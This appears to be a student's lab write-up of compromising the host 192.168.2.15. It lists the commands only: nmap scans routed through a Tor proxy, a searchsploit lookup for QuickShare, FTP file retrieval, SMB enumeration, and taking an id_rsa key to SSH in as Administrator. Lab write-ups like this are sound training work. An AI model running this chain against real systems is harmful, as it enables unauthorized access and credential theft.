# Gnisis 192.168.2.15
## Andrea Zonnekus 18758119

sudo nmap --vv -Pn -sS -sV 192.168.2.15 --open -oA host\_scan --script="default or safe" --proxies socks4://127.0.0.1:9050

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.001.png)

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.002.png)

desktop.ini

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.003.png)

searchsploit quickshare

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.004.png)



cat 16105.py

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.005.png)

ftp 192.168.2.15 -p 8021

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.006.png)

system

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.007.png)

get ntuser.ini

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.008.png)

sudo nmap -sV -sT -sC -Pn -p 445 192.168.2.15 --script=smb\* -oN smb

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.009.png)

nmblookup -A 192.168.2.15

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.010.png)

get id\_rsa

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.011.png)



<https://superuser.com/questions/215504/permissions-on-private-key-in-ssh-folder>

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.012.png)

sudo chmod 600 id\_rsa

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.013.png)

sudo chown kali id\_rsa

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.014.png)

move it to .ssh

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.015.png)

ssh Administrator@192.168.2.15 -i id\_rsa

![](gnisis_steps/Aspose.Words.28e4ef7b-da70-4ad9-b485-2bdd1fae2b86.016.png)
